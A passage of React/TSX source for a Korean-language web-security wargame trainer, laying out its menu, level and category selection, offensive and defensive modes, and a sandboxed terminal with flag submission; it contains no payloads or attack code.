                  <p style={{ fontSize: '12px', color: '#64748b', margin: '8px 0 0' }}>8대 취약점 공격/방어 훈련장</p>
                </div>
                <div onClick={() => setCurrentView('debrief')} className="cyber-action-block" style={{ padding: '24px', cursor: 'pointer', textAlign: 'center' }}>
                  <BookOpen size={36} color="#f43f5e" style={{ margin: '0 auto 12px' }} />
                  <h3 style={{ margin: 0, color: '#f43f5e', fontSize: '17px', fontWeight: 'bold' }}>오답 노트</h3>
                  <p style={{ fontSize: '12px', color: '#64748b', margin: '8px 0 0' }}>틀렸던 문제 모아서 재도전</p>
                </div>
                <div onClick={() => setCurrentView('speedquiz')} className="cyber-action-block" style={{ padding: '24px', cursor: 'pointer', textAlign: 'center' }}>
                  <Sparkles size={36} color="#facc15" style={{ margin: '0 auto 12px' }} />
                  <h3 style={{ margin: 0, color: '#facc15', fontSize: '17px', fontWeight: 'bold' }}>🔁 복습</h3>
                  <p style={{ fontSize: '12px', color: '#64748b', margin: '8px 0 0' }}>풀었던 문제 기출 변형 15초 드릴</p>
                </div>
                <div onClick={() => setCurrentView('community')} className="cyber-action-block" style={{ padding: '24px', cursor: 'pointer', textAlign: 'center' }}>
                  <MessageSquare size={36} color="#4ade80" style={{ margin: '0 auto 12px' }} />
                  <h3 style={{ margin: 0, color: '#4ade80', fontSize: '17px', fontWeight: 'bold' }}>사용자 커뮤니티</h3>
                  <p style={{ fontSize: '12px', color: '#64748b', margin: '8px 0 0' }}>문제 커뮤 · 자유 커뮤 · BEST</p>
                </div>
                <div onClick={() => setCurrentView('ai_help')} className="cyber-action-block" style={{ padding: '24px', cursor: 'pointer', textAlign: 'center' }}>
                  <MessageSquare size={36} color="#a855f7" style={{ margin: '0 auto 12px' }} />
                  <h3 style={{ margin: 0, color: '#a855f7', fontSize: '17px', fontWeight: 'bold' }}>🤖 AI에게 질문하기</h3>
                  <p style={{ fontSize: '12px', color: '#64748b', margin: '8px 0 0' }}>보안 개념을 쉽게 설명해 드려요</p>
                </div>
                <div onClick={() => setCurrentView('guide')} className="cyber-action-block" style={{ padding: '24px', cursor: 'pointer', textAlign: 'center' }}>
                  <Bookmark size={36} color="#a855f7" style={{ margin: '0 auto 12px' }} />
                  <h3 style={{ margin: 0, color: '#a855f7', fontSize: '17px', fontWeight: 'bold' }}>STRATEGY MANUAL</h3>
                  <p style={{ fontSize: '12px', color: '#64748b', margin: '8px 0 0' }}>8대 분야 정밀 마스터 공략집</p>
                </div>
                <div onClick={() => setCurrentView('titles')} className="cyber-action-block" style={{ padding: '24px', cursor: 'pointer', textAlign: 'center' }}>
                  <Award size={36} color="#facc15" style={{ margin: '0 auto 12px' }} />
                  <h3 style={{ margin: 0, color: '#facc15', fontSize: '17px', fontWeight: 'bold' }}>TITLE VAULT</h3>
                  <p style={{ fontSize: '12px', color: '#64748b', margin: '8px 0 0' }}>레벨 및 전술 마스터리 칭호</p>
                </div>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: WARGAMES SECTORS (1 + 2 + 3 통합 모드)
             ========================================== */}
          {currentView === 'wargames' && wargameStage === 'hub' && (
            <div style={{ width: '90%', maxWidth: '1400px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '25px', flex: 1 }}>
              <div>
                <div style={{ fontSize: '12px', color: '#00f2fe', fontWeight: 'bold' }}>WARGAME SECTOR SELECTOR</div>
                <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>🎯 침투 대상 시스템 및 작전 모드</h2>
                <p style={{ margin: '4px 0 0', fontSize: '13px', color: '#94a3b8' }}>난이도별 공략집으로 단계를 밟거나, 실전/심화 모드로 바로 도전하세요.</p>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '18px' }}>
                {([1, 2, 3] as const).map((tier) => {
                  const meta = levelTierMeta[tier];
                  const count = masterProblemDB.filter((p) => levelTierOf(p) === tier).length;
                  const solvedCount = masterProblemDB.filter((p) => levelTierOf(p) === tier && effectiveSolvedIds.includes(p.id)).length;
                  return (
                    <div key={tier} className="cyber-card-main" style={{ padding: '22px', display: 'flex', flexDirection: 'column', gap: '14px', borderColor: `${meta.color}55` }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                        <span style={{ fontSize: '30px' }}>{meta.icon}</span>
                        <span style={{ fontSize: '10px', fontWeight: 900, color: '#000', background: meta.color, padding: '3px 8px', borderRadius: '3px' }}>{meta.tag}</span>
                      </div>
                      <div>
                        <h3 style={{ margin: 0, color: meta.color, fontSize: '17px', fontWeight: 900 }}>{meta.name}</h3>
                        <p style={{ margin: '6px 0 0', fontSize: '12px', color: '#94a3b8' }}>SQLi · XSS 등 {count}문제 ({solvedCount}개 해결)</p>
                      </div>
                      <button
                        onClick={() => { setActiveLevelTier(tier); setWargameStage('browse'); }}
                        style={{ marginTop: 'auto', padding: '10px', fontWeight: 900, fontSize: '13px', cursor: 'pointer', background: `${meta.color}22`, border: `1px solid ${meta.color}`, color: meta.color }}
                      >
                        열기
                      </button>
                    </div>
                  );
                })}

                <div className="cyber-card-main" style={{ padding: '22px', display: 'flex', flexDirection: 'column', gap: '14px', borderColor: 'rgba(16,185,129,0.4)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                    <span style={{ fontSize: '30px' }}>🎮</span>
                    <span style={{ fontSize: '10px', fontWeight: 900, color: '#000', background: '#10b981', padding: '3px 8px', borderRadius: '3px' }}>NEW</span>
                  </div>
                  <div>
                    <h3 style={{ margin: 0, color: '#10b981', fontSize: '17px', fontWeight: 900 }}>실전 풀이 모드</h3>
                    <p style={{ margin: '6px 0 0', fontSize: '12px', color: '#94a3b8' }}>8개 카테고리를 섞은 챌린지 9개를 실전처럼 이어서 도전</p>
                  </div>
                  <button onClick={startRealPracticeRun} style={{ marginTop: 'auto', padding: '10px', fontWeight: 900, fontSize: '13px', cursor: 'pointer', background: 'rgba(16,185,129,0.15)', border: '1px solid #10b981', color: '#10b981' }}>
                    시작
                  </button>
                </div>

                <div className="cyber-card-main" style={{ padding: '22px', display: 'flex', flexDirection: 'column', gap: '14px', borderColor: 'rgba(236,72,153,0.4)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                    <span style={{ fontSize: '30px' }}>🧠</span>
                    <span style={{ fontSize: '10px', fontWeight: 900, color: '#000', background: '#ec4899', padding: '3px 8px', borderRadius: '3px' }}>AI</span>
                  </div>
                  <div>
                    <h3 style={{ margin: 0, color: '#ec4899', fontSize: '17px', fontWeight: 900 }}>심화 풀이 모드</h3>
                    <p style={{ margin: '6px 0 0', fontSize: '12px', color: '#94a3b8' }}>내 AI API 키로 매번 새로운 고급 문제를 즉석 생성</p>
                  </div>
                  <button onClick={() => setCurrentView('aichallenge')} style={{ marginTop: 'auto', padding: '10px', fontWeight: 900, fontSize: '13px', cursor: 'pointer', background: 'rgba(236,72,153,0.15)', border: '1px solid #ec4899', color: '#ec4899' }}>
                    시작
                  </button>
                </div>
              </div>
            </div>
          )}

          {currentView === 'wargames' && wargameStage === 'browse' && (
            <div style={{ width: '90%', maxWidth: '1400px', margin: '30px auto', display: 'flex', flexDirection: 'column', gap: '25px', flex: 1 }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-end' }}>
                <div>
                  <button onClick={() => setWargameStage('hub')} style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer', fontSize: '12px', marginBottom: '6px', padding: 0 }}>← 레벨 선택으로</button>
                  <div style={{ fontSize: '12px', color: levelTierMeta[activeLevelTier].color, fontWeight: 'bold' }}>{levelTierMeta[activeLevelTier].tag}</div>
                  <h2 className="neon-forge-cyan" style={{ margin: '4px 0 0 0', fontSize: '26px', fontWeight: '900' }}>{levelTierMeta[activeLevelTier].icon} {levelTierMeta[activeLevelTier].name}</h2>
                </div>
              </div>

              {/* Dual Mode Switcher */}
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '20px' }}>
                <div
                  onClick={() => setSelectedRole('Hacking')}
                  className="cyber-card-main"
                  style={{
                    padding: '20px',
                    cursor: 'pointer',
                    borderColor: selectedRole === 'Hacking' ? '#ef4444' : 'rgba(239,68,68,0.3)',
                    background: selectedRole === 'Hacking' ? 'rgba(239,68,68,0.15)' : '#050914',
                    boxShadow: selectedRole === 'Hacking' ? '0 0 20px rgba(239,68,68,0.35)' : 'none',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '15px'
                  }}
                >
                  <span style={{ fontSize: '32px', color: '#ef4444' }}>💀</span>
                  <div>
                    <h3 style={{ margin: 0, color: '#ef4444', fontSize: '16px' }}>HACKING (Offensive) 모드</h3>
                    <p style={{ margin: '4px 0 0', fontSize: '12px', color: '#cbd5e1' }}>취약한 백엔드 코드를 분석하고 공격 페이로드를 조합해 침투합니다.</p>
                  </div>
                </div>

                <div
                  onClick={() => setSelectedRole('Security')}
                  className="cyber-card-main"
                  style={{
                    padding: '20px',
                    cursor: 'pointer',
                    borderColor: selectedRole === 'Security' ? '#10b981' : 'rgba(16,185,129,0.3)',
                    background: selectedRole === 'Security' ? 'rgba(16,185,129,0.15)' : '#050914',
                    boxShadow: selectedRole === 'Security' ? '0 0 20px rgba(16,185,129,0.35)' : 'none',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '15px'
                  }}
                >
                  <span style={{ fontSize: '32px', color: '#10b981' }}>🛡️</span>
                  <div>
                    <h3 style={{ margin: 0, color: '#10b981', fontSize: '16px' }}>SECURITY (Defensive) 모드</h3>
                    <p style={{ margin: '4px 0 0', fontSize: '12px', color: '#cbd5e1' }}>코드 오딧을 수행하고 해킹을 원천 차단하는 안전한 코드를 작성합니다.</p>
                  </div>
                </div>
              </div>

              {/* Category Pills & Problem List */}
              <div style={{ display: 'grid', gridTemplateColumns: '280px 1fr', gap: '25px' }}>
                {/* Left Category List */}
                <div className="cyber-card-main" style={{ padding: '15px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                  <div style={{ fontSize: '11px', color: '#64748b', fontWeight: 'bold', padding: '6px 10px' }}>CATEGORIES (8 SECTORS)</div>
                  {categories.map((cat) => (
                    <div
                      key={cat.id}
                      onClick={() => setSelectedCategory(cat.name)}
                      style={{
                        padding: '12px 14px',
                        cursor: 'pointer',
                        background: selectedCategory === cat.name ? 'rgba(0, 242, 254, 0.15)' : '#02050c',
                        border: selectedCategory === cat.name ? '1px solid #00f2fe' : '1px solid rgba(255,255,255,0.05)',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '10px'
                      }}
                    >
                      <span>{cat.icon}</span>
                      <span style={{ fontSize: '13px', fontWeight: 'bold', color: selectedCategory === cat.name ? '#00f2fe' : '#94a3b8' }}>{cat.name}</span>
                    </div>
                  ))}
                </div>

                {/* Right Problem Cards Grid */}
                <div>
                  <div style={{ marginBottom: '15px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <h3 style={{ margin: 0, color: '#fff', fontSize: '18px' }}>
                      {selectedCategory} · <span style={{ color: selectedRole === 'Hacking' ? '#ef4444' : '#10b981' }}>{selectedRole} 작전 목록</span>
                    </h3>
                  </div>

                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '15px' }}>
                    {masterProblemDB
                      .filter(p => p.category === selectedCategory && (p.role === selectedRole || !p.role) && levelTierOf(p) === activeLevelTier)
                      .map((prob) => {
                        const isSolved = effectiveSolvedIds.includes(prob.id);
                        return (
                          <div
                            key={prob.id}
                            onClick={() => startProblemSession(prob)}
                            className="cyber-card-main"
                            style={{
                              padding: '20px',
                              cursor: 'pointer',
                              borderColor: isSolved ? '#10b981' : 'rgba(0, 242, 254, 0.25)',
                              position: 'relative'
                            }}
                          >
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                              <span style={{ fontSize: '11px', color: '#facc15', border: '1px solid #facc15', padding: '2px 6px' }}>+{prob.xp} XP</span>
                              <span style={{ fontSize: '11px', color: isSolved ? '#10b981' : '#94a3b8', fontWeight: 'bold' }}>
                                {isSolved ? '✓ SOLVED' : prob.level}
                              </span>
                            </div>
                            <h4 style={{ margin: '0 0 8px 0', color: '#fff', fontSize: '15px' }}>{prob.title}</h4>
                            <p style={{ margin: 0, fontSize: '12px', color: '#94a3b8', lineHeight: '1.5', overflow: 'hidden', textOverflow: 'ellipsis', display: '-webkit-box', WebkitLineClamp: 2, WebkitBoxOrient: 'vertical' }}>
                              {prob.desc.replace(/<[^>]*>?/gm, '')}
                            </p>
                          </div>
                        );
                      })}
                  </div>

                  {masterProblemDB.filter(p => p.category === selectedCategory && (p.role === selectedRole || !p.role) && levelTierOf(p) === activeLevelTier).length === 0 && (
                    <div className="cyber-card-main" style={{ padding: '40px', textAlign: 'center', color: '#64748b' }}>
                      이 레벨에는 선택한 모드의 문제가 아직 없습니다. 다른 카테고리, 모드 또는 레벨을 선택해 주세요.
                    </div>
                  )}
                </div>
              </div>
            </div>
          )}

          {/* ==========================================
              VIEW: ARENA PLAY (3분할 인터랙티브 샌드박스)
             ========================================== */}
          {currentView === 'arena_play' && (
            <div style={{ width: '100%', height: '100%', display: 'flex', flexDirection: 'column', background: '#020711', position: 'relative' }}>
              {/* 미션 브리핑 분석법 안내 패널 — 본문 위에 쌓지 않고 화면 옆 빈 공간에 고정으로 띄워서
                  시야를 가리지 않게 함. 미션 브리핑 모달이 열려 있어도 이 패널은 항상 그 위(zIndex 250)에
                  떠 있으므로 "다음" 버튼이 모달에 가려 눌리지 않는 문제가 생기지 않음 */}
              {levelTierOf(currentProblem) === 1 && !briefingGuideDone && (() => {
                const steps = [
                  { badge: '1단계', label: '쉬운 시나리오 읽기', text: '어떤 취약점인지 쉬운 일상 비유로 설명된 미션 브리핑을 읽고 미션 목표를 파악하세요.' },
                  { badge: '2단계', label: '터미널에 입력 & RUN', text: '복잡한 코딩 필요 없이, 검은색 터미널 입력창($)에 정답을 타이핑하고 [RUN]을 누르세요.' },
                  { badge: '3단계', label: '위험했던 코드 구경', text: '어떤 코드가 허점이었는지 참고용 소스 코드를 가볍게 구경하세요. (수정하는 곳이 아닙니다!)' },
                  { badge: '4단계', label: '막히면 힌트 & AI 코치', text: '헷갈리거나 어려우면 언제든 [💡 막히면 힌트 보기]나 [🤖 AI 보안 코치]의 도움을 받으세요.' },
                ];
                const isLast = briefingStep === steps.length - 1;
                const cur = steps[briefingStep];
                return (
                  <div className="pt-side-panel cyber-card-main" style={{ padding: '16px', borderColor: '#00f2fe', boxShadow: '0 0 30px rgba(0,242,254,0.35)' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '10px' }}>
                      <span style={{ background: '#00f2fe', color: '#02040a', fontSize: '11px', fontWeight: 900, padding: '2px 10px', borderRadius: '4px' }}>{cur.badge}</span>
                      <span style={{ fontSize: '12px', fontWeight: 900, color: '#e2e8f0' }}>{cur.label}</span>
                      <span style={{ marginLeft: 'auto', fontSize: '10px', color: '#64748b' }}>{briefingStep + 1}/4</span>
                    </div>
                    <div style={{ fontSize: '12.5px', color: '#7dd3fc', lineHeight: '1.7', marginBottom: '14px' }}>
                      👉 {cur.text}
                    </div>
                    <div style={{ display: 'flex', gap: '8px' }}>
                      {briefingStep > 0 && (
                        <button onClick={() => setBriefingStep(briefingStep - 1)} style={{ flex: 1, background: 'transparent', border: '1px solid rgba(148,163,184,0.4)', color: '#94a3b8', padding: '8px 10px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', borderRadius: '4px' }}>
                          ← 이전
                        </button>
                      )}
                      {isLast ? (
                        <button onClick={() => setBriefingGuideDone(true)} style={{ flex: 1, background: 'rgba(16,185,129,0.15)', border: '1px solid #10b981', color: '#10b981', padding: '8px 10px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', borderRadius: '4px' }}>
                          ✅ 완료 — 문제 풀기
                        </button>
                      ) : (
                        <button onClick={() => setBriefingStep(briefingStep + 1)} style={{ flex: 1, background: 'rgba(0,242,254,0.15)', border: '1px solid #00f2fe', color: '#00f2fe', padding: '8px 10px', fontSize: '12px', fontWeight: 'bold', cursor: 'pointer', borderRadius: '4px' }}>
                          다음 →
                        </button>
                      )}
                    </div>
                  </div>
                );
              })()}

              {/* Header Bar */}
              <div style={{ height: '42px', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 20px', borderBottom: '1px solid rgba(0,242,254,0.25)', background: '#07111f' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px', fontSize: '12px', fontWeight: 'bold' }}>
                  <button onClick={exitArenaPlay} style={{ background: 'transparent', border: 'none', color: '#94a3b8', cursor: 'pointer' }}>← 목록으로</button>
                  <span style={{ color: '#00f2fe' }}>🎯 {currentProblem.title}</span>
                  <span style={{ color: currentProblem.role === 'Hacking' ? '#ef4444' : '#10b981', border: `1px solid ${currentProblem.role === 'Hacking' ? '#ef4444' : '#10b981'}`, padding: '2px 8px', fontSize: '11px' }}>
                    {currentProblem.role}
                  </span>
                  {currentProblem.cwe && (
                    <span style={{ color: '#ec4899', border: '1px solid #ec4899', padding: '2px 8px', fontSize: '11px' }}>{currentProblem.cwe}</span>
                  )}
                  {isRunMode && (
                    <span style={{ color: '#10b981', border: '1px solid #10b981', padding: '2px 8px', fontSize: '11px', fontWeight: 900 }}>🎮 실전 런 {runIndex + 1}/{runQueue.length}</span>
                  )}
                </div>

                <div style={{ display: 'flex', alignItems: 'center', gap: '14px', fontSize: '12px', fontWeight: 'bold' }}>
                  <span style={{ color: '#00f2fe', border: '1px solid rgba(0,242,254,0.3)', padding: '3px 8px' }}>⏱ {operationElapsedTimeText}</span>
                  <span style={{ color: '#facc15' }}>보상 +{currentProblem.xp} XP</span>
                  <button onClick={exitArenaPlay} style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid #475569', color: '#cbd5e1', padding: '4px 10px', cursor: 'pointer' }}>나가기</button>
                </div>
              </div>

              {/* Terminal (단독 창) — 남은 세로 공간을 모두 채움 */}
              <div style={{ flex: 1, minHeight: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '20px 24px', gap: '14px', overflowY: 'auto' }}>
                {currentProblem.mockUi && (
                  <div style={{ width: '100%', maxWidth: '1100px', flexShrink: 0, background: '#0b0f1a', border: '1px solid rgba(56,189,248,0.4)', boxShadow: '0 0 24px rgba(56,189,248,0.15)' }}>
                    <div style={{ height: '34px', display: 'flex', alignItems: 'center', gap: '8px', padding: '0 14px', borderBottom: '1px solid rgba(255,255,255,0.08)', background: '#111827' }}>
                      <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ff5f57' }} />
                      <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ffbd2e' }} />
                      <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#28c840' }} />
                      <div style={{ flex: 1, marginLeft: '10px', padding: '4px 10px', background: '#020407', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '4px', color: '#64748b', fontSize: '11px', fontFamily: 'monospace' }}>
                        🔒 {currentProblem.mockUi.urlBar}
                      </div>
                    </div>
                    <div style={{ padding: '20px' }}>
                      <div style={{ fontSize: '10px', color: '#38bdf8', fontWeight: 900, letterSpacing: '1px', marginBottom: '8px' }}>🖥 실제 웹사이트라면 이렇게 보입니다 (타이핑은 아래 터미널에서 하세요)</div>
                      <div style={{ color: '#e2e8f0', fontWeight: 900, fontSize: '15px', marginBottom: '14px' }}>{currentProblem.mockUi.siteLabel}</div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', maxWidth: '460px' }}>
                        <label style={{ fontSize: '12px', color: '#94a3b8' }}>
                          {currentProblem.mockUi.fieldLabel}
                          <input
                            type="text"
                            value={payloadInput}
                            readOnly
                            placeholder={currentProblem.mockUi.fieldPlaceholder || ''}
                            style={{ marginTop: '4px', width: '100%', padding: '10px 12px', background: '#fff', color: '#111827', border: '1px solid #cbd5e1', borderRadius: '4px', fontSize: '13px', boxSizing: 'border-box', cursor: 'default' }}
                          />
                        </label>
                        {currentProblem.mockUi.extraFieldLabel && (
                          <label style={{ fontSize: '12px', color: '#94a3b8' }}>
                            {currentProblem.mockUi.extraFieldLabel}
                            <input type="password" disabled placeholder="(이 실습에서는 몰라도 됩니다)" style={{ marginTop: '4px', width: '100%', padding: '10px 12px', background: '#e5e7eb', color: '#6b7280', border: '1px solid #cbd5e1', borderRadius: '4px', fontSize: '13px', boxSizing: 'border-box' }} />
                          </label>
                        )}
                        <button onClick={executePayload} style={{ marginTop: '4px', padding: '10px 16px', background: '#2563eb', color: '#fff', border: 'none', borderRadius: '4px', fontWeight: 'bold', cursor: 'pointer', fontSize: '13px', alignSelf: 'flex-start' }}>
                          {currentProblem.mockUi.buttonLabel}
                        </button>
                      </div>
                      <div style={{ marginTop: '14px', fontSize: '11px', color: '#64748b', lineHeight: '1.6' }}>
                        💡 이 칸은 아래 터미널에 입력한 값을 그대로 보여주기만 합니다. 버튼을 누르면 서버가 실제로 무슨 일을 했는지 아래 시스템 로그에 표시됩니다.
                      </div>
                    </div>
                  </div>
                )}

                <div style={{ width: '100%', maxWidth: '1100px', flex: 1, minHeight: '420px', background: '#000', border: '1px solid rgba(0,242,254,0.25)', boxShadow: '0 0 30px rgba(0,242,254,0.12)', display: 'flex', flexDirection: 'column' }}>
                  <div style={{ height: '38px', display: 'flex', alignItems: 'center', gap: '8px', padding: '0 14px', borderBottom: '1px solid rgba(255,255,255,0.08)', background: '#050505' }}>
                    <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ff5f57' }} />
                    <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#ffbd2e' }} />
                    <span style={{ width: 10, height: 10, borderRadius: '50%', background: '#28c840' }} />
                    <span style={{ marginLeft: '8px', color: '#64748b', fontFamily: 'monospace', fontSize: '13px' }}>{currentProblem.mockUi ? '시스템 로그 (서버 응답)' : 'operator@aegis-sandbox:~#'}</span>
                  </div>

                  <div style={{ flex: 1, minHeight: '280px', padding: '20px', overflowY: 'auto', fontFamily: 'Consolas, monospace', fontSize: '14.5px', lineHeight: '1.75' }}>
                    <div style={{ color: '#38bdf8' }}>[AEGIS-SANDBOX] 가상 샌드박스 인스턴스 준비 완료.</div>
                    <div style={{ color: '#94a3b8' }}>타겟: [{currentProblem.title}] | 카테고리: {currentProblem.category}</div>
                    <div style={{ color: '#e2e8f0', borderBottom: '1px solid rgba(255,255,255,0.2)', paddingBottom: '8px', marginBottom: '12px' }}>
                      {currentProblem.mockUi
                        ? '아래 터미널에 입력하고 실행하면 위 화면에도 반영되고, 여기에 서버 응답이 표시됩니다. (좌측 하단 버튼으로 미션 브리핑과 AI 코치를 열 수 있습니다)'
                        : '터미널에 페이로드를 실행하여 시스템 응답을 확인하세요. (좌측 하단 버튼으로 미션 브리핑과 AI 코치를 열 수 있습니다)'}
                    </div>

                    {terminalLogs.map((log, idx) => (
                      <div key={idx} style={{ color: log.type === 'error' ? '#f43f5e' : log.type === 'success' ? '#10b981' : log.type === 'warning' ? '#facc15' : '#4ade80', marginBottom: '6px' }}>
                        {log.text}
                      </div>
                    ))}
                    <div ref={logEndRef} />
                  </div>

                  {/* Terminal Input Line — mockUi가 있는 문제는 위 가짜 웹페이지가 입력을 대신하므로 숨김 */}
                  {currentProblem.mockUi ? (
                    <div>
                      <div style={{ padding: '4px 14px', fontSize: '11px', color: '#64748b', background: '#010407' }}>
                        💡 타이핑은 여기서만 하세요 — 입력한 값이 위 화면에도 실시간으로 그대로 반영됩니다.
                      </div>
                      <div
                        ref={terminalInputRowRef}
                        className={levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 ? 'pt-box-active' : ''}
                        style={{ position: 'relative', borderTop: '1px solid rgba(0,242,254,0.2)', padding: '13px 16px', display: 'flex', alignItems: 'center', gap: '10px', background: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 ? 'rgba(255,255,255,0.18)' : '#010407', outline: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 ? '4px solid #ffffff' : 'none', outlineOffset: '-1px' }}
                      >
                        {levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 && (
                          <span style={{ position: 'absolute', top: '-11px', left: '14px', background: '#00f2fe', color: '#02040a', fontSize: '11px', fontWeight: 900, padding: '2px 10px', borderRadius: '4px', boxShadow: '0 0 10px rgba(0,242,254,0.5)' }}>2단계</span>
                        )}
                        <span style={{ color: '#10b981', fontFamily: 'monospace', fontWeight: 'bold', whiteSpace: 'nowrap' }}>operator@target:~$</span>
                        <input
                          type="text"
                          value={payloadInput}
                          onChange={(e) => setPayloadInput(e.target.value)}
                          onKeyDown={(e) => { if (e.key === 'Enter') executePayload(); }}
                          style={{ flex: 1, background: 'transparent', border: 'none', color: '#e2e8f0', outline: 'none', fontFamily: 'Consolas, monospace', fontSize: '14.5px' }}
                        />
                        <button onClick={executePayload} style={{ background: 'rgba(0,242,254,0.1)', border: '1px solid #00f2fe', color: '#00f2fe', padding: '6px 14px', cursor: 'pointer', fontWeight: 'bold' }}>
                          RUN
                        </button>
                      </div>
                    </div>
                  ) : (
                    <div
                      ref={terminalInputRowRef}
                      className={levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 ? 'pt-box-active' : ''}
                      style={{ position: 'relative', borderTop: '1px solid rgba(0,242,254,0.2)', padding: '13px 16px', display: 'flex', alignItems: 'center', gap: '10px', background: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 ? 'rgba(255,255,255,0.18)' : '#010407', outline: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 ? '4px solid #ffffff' : 'none', outlineOffset: '-1px' }}
                    >
                      {levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 1 && (
                        <span style={{ position: 'absolute', top: '-11px', left: '14px', background: '#00f2fe', color: '#02040a', fontSize: '11px', fontWeight: 900, padding: '2px 10px', borderRadius: '4px', boxShadow: '0 0 10px rgba(0,242,254,0.5)' }}>2단계</span>
                      )}
                      <span style={{ color: '#10b981', fontFamily: 'monospace', fontWeight: 'bold', whiteSpace: 'nowrap' }}>operator@target:~$</span>
                      <input
                        type="text"
                        value={payloadInput}
                        onChange={(e) => setPayloadInput(e.target.value)}
                        onKeyDown={(e) => { if (e.key === 'Enter') executePayload(); }}
                        placeholder="페이로드 또는 패치 코드를 입력하세요..."
                        style={{ flex: 1, background: 'transparent', border: 'none', color: '#e2e8f0', outline: 'none', fontFamily: 'Consolas, monospace', fontSize: '14.5px' }}
                      />
                      <button onClick={executePayload} style={{ background: 'rgba(0,242,254,0.1)', border: '1px solid #00f2fe', color: '#00f2fe', padding: '6px 14px', cursor: 'pointer', fontWeight: 'bold' }}>
                        RUN
                      </button>
                    </div>
                  )}

                  {/* Level 1은 정답 입력만으로 완료한다. */}
                  {levelTierOf(currentProblem) !== 1 && <div style={{ padding: '10px 14px', display: 'flex', gap: '10px', background: '#07111f', borderTop: '1px solid rgba(0,242,254,0.2)' }}>
                    <label style={{ color: '#38bdf8', fontSize: '12px', fontWeight: 'bold', alignSelf: 'center' }}>FLAG:</label>
                    <input
                      type="text"
                      value={flagInput}
                      onChange={(e) => setFlagInput(e.target.value)}
                      placeholder="FLAG{...}"
                      style={{ flex: 1, padding: '8px 12px', background: '#020407', border: '1px solid rgba(0,242,254,0.22)', color: '#e2e8f0', outline: 'none', fontFamily: 'Consolas, monospace', fontSize: '13px' }}
                    />
                    <button onClick={() => submitFlag()} className="cyber-btn-cyan" style={{ padding: '8px 20px', fontSize: '13px' }}>
                      SUBMIT
                    </button>
                  </div>}
                </div>

              </div>

              {/* 미션 브리핑 / AI 보안 코치 — 화면 왼쪽 아래에 고정된 플로팅 버튼.
                  예전엔 터미널 카드 안 일반 흐름에 있어서, 4단계에서 이 버튼이 밝게 강조될 때
                  세로 공간을 더 차지하면서 바로 위 FLAG 제출 칸이 화면 밖으로 밀려나는 문제가 있었음 —
                  고정 위치로 빼서 FLAG 칸을 항상 그대로 볼 수 있게 함 */}
              <div className="pt-mission-toolbar" style={{ position: 'relative' }}>
                {levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 3 && (
                  <span style={{ position: 'absolute', top: '-11px', left: '4px', background: '#00f2fe', color: '#02040a', fontSize: '11px', fontWeight: 900, padding: '2px 10px', borderRadius: '4px', boxShadow: '0 0 10px rgba(0,242,254,0.5)', zIndex: 1 }}>4단계</span>
                )}
                <div
                  className={levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 3 ? 'pt-box-active' : ''}
                  style={{ display: 'flex', gap: '12px', padding: '6px', borderRadius: '8px', border: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 3 ? '4px solid #ffffff' : '4px solid transparent', background: levelTierOf(currentProblem) === 1 && !briefingGuideDone && briefingStep === 3 ? 'rgba(255,255,255,0.18)' : 'transparent' }}
                >
                  <button
                    ref={missionBriefingBtnRef}
                    onClick={() => setIsMissionModalOpen((prev) => !prev)}
                    style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '12px 20px', fontWeight: 900, fontSize: '13px', cursor: 'pointer', borderRadius: '4px', background: 'rgba(5,9,20,0.92)', border: `1px solid ${isMissionModalOpen ? '#00f2fe' : 'rgba(0,242,254,0.4)'}`, color: '#00f2fe', boxShadow: isMissionModalOpen ? '0 0 25px rgba(0,242,254,0.5)' : '0 0 12px rgba(0,242,254,0.2)' }}
                  >
                    📋 미션 브리핑 {isMissionModalOpen ? '닫기' : '열기'}
                  </button>
                  <button
                    ref={aiCoachBtnRef}
